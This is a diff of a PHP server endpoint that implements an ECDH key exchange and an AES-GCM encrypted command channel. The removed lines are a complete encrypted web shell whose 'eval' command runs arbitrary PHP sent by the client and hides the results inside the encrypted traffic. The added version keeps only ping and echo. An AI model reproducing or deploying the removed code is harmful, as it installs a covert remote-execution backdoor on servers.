@@ -1,149 +1,76 @@
 <?php
 
-$pass = 'cmd';
-
+session_start();
 header("Content-Type: application/json");
 
-function find_openssl_conf()
+function init_keys()
 {
-    $candidates = [
-        "D:/xampp/apache/conf/openssl.cnf",
-        "D:/xampp/php/extras/openssl/openssl.cnf",
-        "C:/xampp/apache/conf/openssl.cnf",
-        "C:/xampp/php/extras/openssl/openssl.cnf",
-        "/etc/ssl/openssl.cnf",
-        "/usr/lib/ssl/openssl.cnf",
-        "/usr/local/etc/openssl/openssl.cnf",
-        "/opt/homebrew/etc/openssl/openssl.cnf",
-    ];
+    // ECDH keypair
+    if (!isset($_SESSION['ecdh_priv'])) {
 
-    $env = getenv("OPENSSL_CONF");
-    if ($env && file_exists($env))
-        return $env;
+        $config = [
+            "curve_name" => "prime256v1",
+            "private_key_type" => OPENSSL_KEYTYPE_EC
+        ];
 
-    $which = shell_exec("openssl version -d 2>/dev/null") ?? shell_exec("openssl version -d 2>nul");
-    if ($which && preg_match('/OPENSSLDIR:\s*"([^"]+)"/', $which, $m)) {
-        $path = rtrim($m[1], "/\\") . "/openssl.cnf";
-        if (file_exists($path))
-            return $path;
-    }
+        $res = openssl_pkey_new($config);
+        openssl_pkey_export($res, $priv);
 
-    $phpDir = dirname(PHP_BINARY);
-    foreach ([$phpDir, dirname($phpDir)] as $base) {
-        foreach (["/extras/openssl/openssl.cnf", "/conf/openssl.cnf"] as $suffix) {
-            if (file_exists($base . $suffix))
-                return $base . $suffix;
-        }
-    }
-
-    foreach ($candidates as $path) {
-        if (file_exists($path))
-            return $path;
-    }
-
-    return null;
-}
-
-$OPENSSL_CONF = find_openssl_conf();
-if (!$OPENSSL_CONF) {
-    http_response_code(500);
-    echo json_encode(["error" => "openssl.cnf not found"]);
-
-    exit;
-}
-
-function cache_get($key) {
-    $file = sys_get_temp_dir() . "/phpcache_" . md5($key) . ".json";
-    if (!file_exists($file)) return false;
-    $data = json_decode(file_get_contents($file), true);
-    return $data['value'] ?? false;
-}
-
-function cache_set($key, $value) {
-    $file = sys_get_temp_dir() . "/phpcache_" . md5($key) . ".json";
-    file_put_contents($file, json_encode(['value' => $value]));
-}
-
-function get_master_keys($conf)
-{
-    $priv = cache_get("master_sign_priv");
-    $pub  = cache_get("master_sign_pub");
-
-    if (!$priv || !$pub) {
-        $res = openssl_pkey_new([
-            "private_key_bits" => 2048,
-            "private_key_type" => OPENSSL_KEYTYPE_RSA,
-            "config" => $conf,
-        ]);
-
-        openssl_pkey_export($res, $priv, null, ["config" => $conf]);
         $pub = openssl_pkey_get_details($res)['key'];
 
-        cache_set("master_sign_priv", $priv);
-        cache_set("master_sign_pub",  $pub);
+        $_SESSION['ecdh_priv'] = $priv;
+        $_SESSION['ecdh_pub']  = $pub;
     }
 
-    return [$priv, $pub];
-}
+    // signing key (server identity)
+    if (!isset($_SESSION['sign_priv'])) {
 
-define("TOKEN_KEY_LEN", 32);
+        $config = [
+            "private_key_bits" => 2048,
+            "private_key_type" => OPENSSL_KEYTYPE_RSA
+        ];
 
-function get_token_master_key()
-{
-    $key = cache_get("token_master_key");
-    if (!$key) {
-        $key = base64_encode(random_bytes(32));  // store as base64 string
-        cache_set("token_master_key", $key);
+        $res = openssl_pkey_new($config);
+        openssl_pkey_export($res, $priv);
+
+        $pub = openssl_pkey_get_details($res)['key'];
+
+        $_SESSION['sign_priv'] = $priv;
+        $_SESSION['sign_pub']  = $pub;
     }
-    return base64_decode($key);  // return raw bytes for crypto use
+
+    if (!isset($_SESSION['aes_key'])) {
+        $_SESSION['aes_key'] = null;
+    }
+
+    if (!isset($_SESSION['last_seq'])) {
+        $_SESSION['last_seq'] = 0;
+    }
+
+    if (!isset($_SESSION['seq_window'])) {
+        $_SESSION['seq_window'] = [];
+    }
 }
 
-function seal_token($data)
+init_keys();
+
+function jsonOut($data)
 {
-    $key = get_token_master_key();
-    $iv = random_bytes(12);
-    $plain = json_encode($data);
-
-    $cipher = openssl_encrypt(
-        $plain, "aes-256-gcm", $key,
-        OPENSSL_RAW_DATA, $iv, $tag
-    );
-
-    // Use URL-safe base64 (replace +/= with -_~)
-    return rtrim(strtr(base64_encode($iv . $tag . $cipher), '+/', '-_'), '=');
-}
-
-function open_token($token)
-{
-    $key = get_token_master_key();
-    // Reverse URL-safe base64
-    $token = strtr($token, '-_', '+/');
-    $pad = strlen($token) % 4;
-    if ($pad) $token .= str_repeat('=', 4 - $pad);
-
-    $raw = base64_decode($token);
-
-    $iv = substr($raw, 0, 12);
-    $tag = substr($raw, 12, 16);
-    $cipher = substr($raw, 28);
-
-    $plain = openssl_decrypt(
-        $cipher, "aes-256-gcm", $key,
-        OPENSSL_RAW_DATA, $iv, $tag
-    );
-
-    if ($plain === false)
-        return null;
-
-    return json_decode($plain, true);
+    echo json_encode($data);
+    exit;
 }
 
 function aes_encrypt($key, $data)
 {
     $iv = random_bytes(12);
+
     $cipher = openssl_encrypt(
-        json_encode($data), "aes-256-gcm", $key,
-        OPENSSL_RAW_DATA, $iv, $tag
+        json_encode($data),
+        "aes-256-gcm",
+        $key,
+        OPENSSL_RAW_DATA,
+        $iv,
+        $tag
     );
 
     return $iv . $tag . $cipher;
@@ -156,154 +83,108 @@ function aes_decrypt($key, $raw)
     $cipher = substr($raw, 28);
 
     $plain = openssl_decrypt(
-        $cipher, "aes-256-gcm", $key,
-        OPENSSL_RAW_DATA, $iv, $tag
+        $cipher,
+        "aes-256-gcm",
+        $key,
+        OPENSSL_RAW_DATA,
+        $iv,
+        $tag
     );
 
     return json_decode($plain, true);
 }
 
-function jsonOut($data)
-{
-    echo json_encode($data);
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+
+    $serverPub = $_SESSION['ecdh_pub'];
+
+    openssl_sign(
+        $serverPub,
+        $sig,
+        $_SESSION['sign_priv'],
+        OPENSSL_ALGO_SHA256
+    );
+
+    jsonOut([
+        "serverPubKey" => $serverPub,
+        "signature" => base64_encode($sig)
+    ]);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SESSION['aes_key'] === null) {
+
+    $clientPub = file_get_contents("php://input");
+
+    $serverPriv = $_SESSION['ecdh_priv'];
+
+    $clientKey = openssl_pkey_get_public($clientPub);
+    $serverKey = openssl_pkey_get_private($serverPriv);
+
+    $secret = openssl_pkey_derive($clientKey, $serverKey, 32);
+
+    $_SESSION['aes_key'] = hash_hkdf(
+        "sha256",
+        $secret,
+        32,
+        "secure-channel"
+    );
+
+    jsonOut(["status" => "secure channel established"]);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SESSION['aes_key']) {
+
+    $key = $_SESSION['aes_key'];
+
+    $raw = file_get_contents("php://input");
+
+    $req = aes_decrypt($key, $raw);
+
+    if (!isset($req['seq'], $req['cmd'])) {
+        jsonOut(["error" => "invalid request"]);
+    }
+
+    $seq = (int)$req['seq'];
+
+    $window = &$_SESSION['seq_window'];
+
+    if ($seq <= $_SESSION['last_seq'] - 50) {
+        echo json_encode(["error" => "too old"]);
+        exit;
+    }
+
+    if (in_array($seq, $window, true)) {
+        echo json_encode(["error" => "replay detected"]);
+        exit;
+    }
+
+    $window[] = $seq;
+
+    if (count($window) > 50) {
+        array_shift($window);
+    }
+
+    if ($seq > $_SESSION['last_seq']) {
+        $_SESSION['last_seq'] = $seq;
+    }
+
+    switch ($req['cmd']) {
+
+        case "ping":
+            $resp = ["cmd" => "pong", "seq" => $seq];
+            break;
+
+        case "echo":
+            $resp = ["echo" => $req['data'] ?? null];
+            break;
+
+        default:
+            $resp = ["error" => "unknown cmd"];
+    }
+
+    header("Content-Type: application/octet-stream");
+    echo aes_encrypt($key, $resp);
     exit;
 }
 
-$method = $_SERVER['REQUEST_METHOD'];
-$body = file_get_contents("php://input");
-
-if ($method === 'GET') {
-
-    [$signPriv, $signPub] = get_master_keys($OPENSSL_CONF);
-
-    $res = openssl_pkey_new([
-        "curve_name"       => "prime256v1",
-        "private_key_type" => OPENSSL_KEYTYPE_EC,
-        "config"           => $OPENSSL_CONF,
-    ]);
-    openssl_pkey_export($res, $ecdhPriv, null, ["config" => $OPENSSL_CONF]);
-    $ecdhPub = trim(openssl_pkey_get_details($res)['key']);
-
-    openssl_sign($ecdhPub, $sig, $signPriv, OPENSSL_ALGO_SHA256);
-
-    $token = seal_token([
-        "ecdh_priv" => $ecdhPriv,
-        "created" => time(),
-    ]);
-
-    jsonOut([
-        "signPubKey" => $signPub,
-        "serverEcdhPub" => $ecdhPub,
-        "signature" => base64_encode($sig),
-        "handshakeToken" => $token,
-    ]);
-}
-
-// POST with handshakeToken + clientPubKey + clientSignPub
-// Mutual auth: client proves it holds the private key by signing its own pub key
-if ($method === 'POST') {
-
-    $req = json_decode($body, true);
-
-    // Handshake
-    if (isset($req['handshakeToken'], $req['clientEcdhPub'], $req['clientSignPub'], $req['clientSig'])) {
-        $state = open_token($req['handshakeToken']);
-        if (!$state)
-            jsonOut(["error" => "invalid or tampered token"]);
-
-        if (time() - $state['created'] > 300)
-            jsonOut(["error" => "handshake token expired"]);
-
-        $clientEcdhPub = trim($req['clientEcdhPub']);
-        $clientSignPub = trim($req['clientSignPub']);
-        $clientSig = base64_decode($req['clientSig']);
-
-        $clientSignKey = openssl_pkey_get_public($clientSignPub);
-        $valid = openssl_verify($clientEcdhPub, $clientSig, $clientSignKey, OPENSSL_ALGO_SHA256);
-
-        if ($valid !== 1)
-            jsonOut(["error" => "client authentication failed"]);
-
-        $serverKey = openssl_pkey_get_private($state['ecdh_priv']);
-        $clientKey = openssl_pkey_get_public($clientEcdhPub);
-        $secret = openssl_pkey_derive($clientKey, $serverKey, 32);
-
-        $aesKey = hash_hkdf("sha256", $secret, 32, "secure-channel");
-
-        $sessionToken = seal_token([
-            "aes_key" => base64_encode($aesKey),
-            "last_seq" => 0,
-            "seq_window" => [],
-            "client_sign_pub" => $clientSignPub,  // remember who we authed
-        ]);
-
-        jsonOut(["status" => "secure channel established", "sessionToken" => $sessionToken]);
-    }
-
-    if (isset($req['sessionToken'], $req['payload'])) {
-
-        $state = open_token($req['sessionToken']);
-        if (!$state)
-            jsonOut(["error" => "invalid session token"]);
-
-        $aesKey = base64_decode($state['aes_key']);
-
-        $raw = base64_decode($req['payload']);
-        $cmd = aes_decrypt($aesKey, $raw);
-
-        if (!isset($cmd['seq'], $cmd[$pass]))
-            jsonOut(["error" => "invalid request"]);
-
-        $seq = (int)$cmd['seq'];
-        $window = $state['seq_window'];
-
-        if ($seq <= $state['last_seq'] - 50)
-            jsonOut(["error" => "too old"]);
-
-        if (in_array($seq, $window, true))
-            jsonOut(["error" => "replay detected"]);
-
-        $window[] = $seq;
-        if (count($window) > 50)
-            array_shift($window);
-
-        if ($seq > $state['last_seq'])
-            $state['last_seq'] = $seq;
-
-        switch ($cmd[$pass]) {
-            case "ping":
-                $resp = ["cmd" => "ping", "seq" => $seq];
-                break;
-            case "echo":
-                $resp = ["echo" => $cmd['data'] ?? null];
-                break;
-            case "eval":
-                ob_start();
-                @eval($cmd['data']);
-                $info = ob_get_clean();
-                $info = base64_encode($info);
-                $resp = ["eval" => $info ?? null];
-                break;
-            default:
-                $resp = ["error" => "unknown cmd"];
-        }
-
-        $newToken = seal_token([
-            "aes_key" => $state['aes_key'],
-            "last_seq" => $state['last_seq'],
-            "seq_window" => $window,
-            "client_sign_pub" => $state['client_sign_pub'],
-            "cwd" => $state['cwd'] ?? '.',
-            "env" => $state['env'] ?? [],
-        ]);
-
-        $encResp = base64_encode(aes_encrypt($aesKey, $resp));
-
-        header("Content-Type: application/json");
-        echo json_encode(["payload" => $encResp, "sessionToken" => $newToken]);
-
-        exit;
-    }
-}
-
-jsonOut(["error" => "invalid request"]);
+jsonOut(["error" => "invalid"]);
